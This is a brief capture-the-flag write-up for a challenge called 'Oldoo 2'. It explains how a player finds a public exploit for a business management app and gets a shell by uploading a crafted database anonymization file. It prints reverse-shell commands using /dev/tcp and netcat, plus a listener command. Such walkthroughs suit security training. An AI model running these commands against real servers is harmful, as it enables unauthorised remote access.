# Oldoo 2

The player can get the business management software version in the setting and search available vulnerability on Google.
The player will get a result lead to this website [https://www.exploit-db.com/exploits/44064].
Based on the description, the player can:

1. Download the python script, the player can change the line `return (os.system, (("bash -i >& /dev/tcp/127.0.0.1/8000 0>&1"),))` to `return (os.system, (("nc [your ip address] [port] -e /bash/bin"),))`
2. Run the script to create a payload
3. Go to Settings and check the Database anonymization section
4. Open a terminal and run the command `nc -nlvp [port]`
5. Select the Anonymize database
6. Upload the payload as Anonymization file
7. Click on Reverse the Database Anonymization

The player should get the access to the server now in the terminal.
Using the command `ls`, the user can see the user_flag.txt and view it.
